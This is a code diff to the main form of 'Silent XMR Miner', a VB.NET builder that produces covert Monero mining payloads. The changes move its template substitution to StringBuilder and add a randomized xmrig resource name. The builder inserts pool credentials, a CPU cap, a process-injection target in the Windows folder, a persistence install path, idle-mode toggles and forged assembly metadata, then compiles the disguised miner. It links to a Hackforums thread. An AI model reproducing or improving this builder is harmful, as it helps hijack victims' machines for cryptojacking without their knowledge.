@@ -1,4 +1,6 @@
-﻿Public Class Form1
+﻿Imports System.Text
+
+Public Class Form1
     Public Shared rand As New Random()
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
@@ -38,6 +40,7 @@
     Public OutputPayload
     Public Resources_dll = Randomi(rand.Next(5, 10))
     Public Resources_xmr = Randomi(rand.Next(5, 10))
+    Public Resources_xmrig = Randomi(rand.Next(5, 10))
     Public Resources_libs = Randomi(rand.Next(5, 10))
     Public Resources_winring = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
@@ -70,60 +73,63 @@
             Dim InjectionTarget = txtInjection.Text.Split(" ")
             Dim Source = My.Resources.Program
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
-            Source = Replace(Source, "#dll", Resources_dll)
-            Source = Replace(Source, "#xmr", Resources_xmr)
-            Source = Replace(Source, "#libs", Resources_libs)
-            Source = Replace(Source, "#winring", Resources_winring)
-            Source = Replace(Source, "#ParentRes", Resources_Parent)
-            Source = Replace(Source, "#USER", txtPoolUsername.Text)
-            Source = Replace(Source, "#URL", txtPoolURL.Text)
-            Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
-            Source = Replace(Source, "#KEY", AESKEY)
-            Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
-            Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
-            Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
+            Dim builder As New StringBuilder(Source)
+            builder.Replace("#dll", Resources_dll)
+            builder.Replace("#xmr", Resources_xmrig)
+            builder.Replace("#libs", Resources_libs)
+            builder.Replace("#winring", Resources_winring)
+            builder.Replace("#ParentRes", Resources_Parent)
+            builder.Replace("#USER", txtPoolUsername.Text)
+            builder.Replace("#URL", txtPoolURL.Text)
+            builder.Replace("#PWD", txtPoolPassowrd.Text)
+            builder.Replace("#KEY", AESKEY)
+            builder.Replace("#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
+            builder.Replace("#InjectionTarget", InjectionTarget(0))
+            builder.Replace("#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
 
 
             txtLog.Text = txtLog.Text + ("Adding injection " + txtInjection.Text + vbNewLine)
 
             If chkInstall.Checked = True Then
-                Source = Replace(Source, "#Const INS = False", "#Const INS = True")
-                Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+                builder.Replace("#Const INS = False", "#Const INS = True")
+                builder.Replace("PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
             End If
 
             If toggleEnableGPU.Checked = True Then
-                Source = Replace(Source, "#Const EnableGPU = False", "#Const EnableGPU = True")
+                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
             End If
 
             If toggleEnableIdle.Checked = True Then
-                Source = Replace(Source, "#Const EnableIdle = False", "#Const EnableIdle = True")
+                builder.Replace("#Const EnableIdle = False", "#Const EnableIdle = True")
             End If
 
             If toggleEnableNicehash.Checked = True Then
-                Source = Replace(Source, "#Const EnableNicehash = False", "#Const EnableNicehash = True")
+                builder.Replace("#Const EnableNicehash = False", "#Const EnableNicehash = True")
             End If
 
             If toggleEnableCPU.Checked = True Then
-                Source = Replace(Source, "#Const EnableCPU = False", "#Const EnableCPU = True")
+                builder.Replace("#Const EnableCPU = False", "#Const EnableCPU = True")
             End If
 
             If chkAssembly.Checked = True Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
-                Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")
+                builder.Replace("#Const Assembly = False", "#Const Assembly = True")
 
-                Source = Replace(Source, "%Title%", txtTitle.Text)
-                Source = Replace(Source, "%Description%", txtDescription.Text)
-                Source = Replace(Source, "%Company%", txtCompany.Text)
-                Source = Replace(Source, "%Product%", txtProduct.Text)
-                Source = Replace(Source, "%Copyright%", txtCopyright.Text)
-                Source = Replace(Source, "%Trademark%", txtTrademark.Text)
-                Source = Replace(Source, "%v1%", num_Assembly1.Text)
-                Source = Replace(Source, "%v2%", num_Assembly2.Text)
-                Source = Replace(Source, "%v3%", num_Assembly3.Text)
-                Source = Replace(Source, "%v4%", num_Assembly4.Text)
-                Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)
+                builder.Replace("%Title%", txtTitle.Text)
+                builder.Replace("%Description%", txtDescription.Text)
+                builder.Replace("%Company%", txtCompany.Text)
+                builder.Replace("%Product%", txtProduct.Text)
+                builder.Replace("%Copyright%", txtCopyright.Text)
+                builder.Replace("%Trademark%", txtTrademark.Text)
+                builder.Replace("%v1%", num_Assembly1.Text)
+                builder.Replace("%v2%", num_Assembly2.Text)
+                builder.Replace("%v3%", num_Assembly3.Text)
+                builder.Replace("%v4%", num_Assembly4.Text)
+                builder.Replace("%Guid%", Guid.NewGuid.ToString)
 
             End If
+
+            Source = builder.ToString
 
             If chkIcon.Checked And txtIconPath.Text IsNot "" Then
                 Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
@@ -339,4 +345,5 @@
     Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
         Process.Start("https://hackforums.net/showthread.php?tid=5995773")
     End Sub
+
 End Class
